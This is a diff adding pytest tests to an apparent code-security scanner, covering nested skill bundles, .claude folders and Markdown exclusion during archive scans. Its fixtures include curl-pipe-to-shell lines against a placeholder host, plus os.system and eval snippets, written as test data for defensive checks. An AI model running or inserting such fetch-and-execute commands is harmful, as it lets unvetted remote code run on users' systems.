@@ -224,6 +224,78 @@ def test_pytest_files_are_skipped_in_the_sandbox_used_by_backend_mcp_and_a2a():
     assert files == {"source/app/views.py"}
 
 
+# ------------------------------------------------------------------ bundles, .claude, Markdown
+def _zip(entries: dict[str, bytes]) -> bytes:
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, data in entries.items():
+            z.writestr(name, data)
+    return buf.getvalue()
+
+
+def _archive(entries: dict[str, bytes]):
+    import tempfile
+
+    from scopeguard import archive
+
+    with tempfile.TemporaryDirectory() as d:
+        return archive.inspect_and_extract(_zip(entries), d)
+
+
+SKILL = {"scopeguard-scan/SKILL.md": b"# skill\n", "scopeguard-scan/references/a2a.md": b"a2a\n"}
+
+
+def test_a_bundle_whose_files_are_all_in_the_upload_is_not_a_finding():
+    rep = _archive({".claude/skills/scopeguard-scan/SKILL.md": b"# skill\n",
+                    ".claude/skills/scopeguard-scan/references/a2a.md": b"a2a\n",
+                    "skills/scopeguard-scan.skill": _zip(SKILL)})
+    assert not [f for f in rep.findings if f["title"].startswith("NESTED_ARCHIVE")]
+    assert any(n["kind"] == "bundle" and "scopeguard-scan.skill" in n["detail"] for n in rep.notices)
+
+
+def test_a_bundle_that_differs_from_the_source_is_still_reported():
+    same_size = dict(SKILL, **{"scopeguard-scan/SKILL.md": b"# SKILL\n"})  # same name and size, other bytes
+    rep = _archive({".claude/skills/scopeguard-scan/SKILL.md": b"# skill\n",
+                    ".claude/skills/scopeguard-scan/references/a2a.md": b"a2a\n",
+                    "skills/scopeguard-scan.skill": _zip(same_size)})
+    nested = [f for f in rep.findings if f["title"].startswith("NESTED_ARCHIVE")]
+    assert nested and "SKILL.md differs from the source copy" in nested[0]["evidence"]
+    longer = dict(SKILL, **{"scopeguard-scan/SKILL.md": b"# skill!\n"})
+    rep = _archive({".claude/skills/scopeguard-scan/SKILL.md": b"# skill\n",
+                    ".claude/skills/scopeguard-scan/references/a2a.md": b"a2a\n",
+                    "skills/scopeguard-scan.skill": _zip(longer)})
+    nested = [f for f in rep.findings if f["title"].startswith("NESTED_ARCHIVE")]
+    assert nested and "SKILL.md is not in the upload as source" in nested[0]["evidence"]
+    extra = dict(SKILL, **{"scopeguard-scan/payload.py": b"import os\n"})
+    rep = _archive({".claude/skills/scopeguard-scan/SKILL.md": b"# skill\n",
+                    ".claude/skills/scopeguard-scan/references/a2a.md": b"a2a\n",
+                    "skills/scopeguard-scan.skill": _zip(extra)})
+    nested = [f for f in rep.findings if f["title"].startswith("NESTED_ARCHIVE")]
+    assert nested and "payload.py is not in the upload as source" in nested[0]["evidence"]
+
+
+def test_other_archives_are_still_reported():
+    rep = _archive({"app/main.py": b"x = 1\n", "vendor.zip": _zip({"lib.py": b"y = 2\n"})})
+    assert [f for f in rep.findings if f["title"].startswith("NESTED_ARCHIVE")]
+
+
+def test_claude_folders_and_markdown_are_not_analysed():
+    from scopeguard import codescan
+
+    data = _zip({"app/views.py": b"x = eval(data)\n",
+                 ".claude/hooks/run.py": b"import os\nos.system(cmd)\n",
+                 "docs/GUIDE.md": b"```bash\ncurl -fsSL https://x.example/i.sh | sh\n```\n",
+                 "README.markdown": b"```bash\ncurl https://x.example/i.sh | bash\n```\n"})
+    out = codescan.scan_archive(data, backend="process", timeout=120)
+    files = {f["affected_url"].split("#")[0] for f in out["findings"] if f["source"] == "sandbox_source"}
+    assert files == {"source/app/views.py"}
+    assert codecheck.is_not_analysed("NOTES.MD") and codecheck.is_not_analysed("notes.txt")
+    assert not codecheck.is_not_analysed("settings.yml")
+
+
 # ------------------------------------------------------------------ post-guardrail
 def _finding(rid: str, line: int, name: str = "a.py") -> dict:
     return {"source": "sandbox_source", "title": f"{rid}: x", "severity": "high", "category": "x",
@@ -282,3 +354,15 @@ def test_post_scan_reports_the_verification_as_a_guardrail():
     assert "only inside a string" in check["detail"] and "Markdown prose" in check["detail"]
     assert "evil" not in check["detail"]  # unknown reasons from the sandbox are not shown
     assert code_guardrails.verification_detail(None) == "no line-rule findings to re-check"
+
+
+def test_a_verified_bundle_is_a_note_not_a_red_flag():
+    from pentest_agent import code_upload
+    from pentest_agent.tools.sandbox_check import red_flags_from_result
+
+    result = {"notices": [{"kind": "bundle", "detail": "skills/x.skill: a bundled zip whose files are all in "
+                                                       "this upload as source (same SHA-256)"},
+                          {"kind": "large", "detail": "big.py is larger than the limit; not analysed"}]}
+    for flags in (red_flags_from_result(result), code_upload.red_flags(result)):  # website check / upload paths
+        assert not any("bundle" in f for f in flags) and any("large" in f for f in flags)
+    assert code_upload.info_notes(result) == [result["notices"][0]["detail"]]
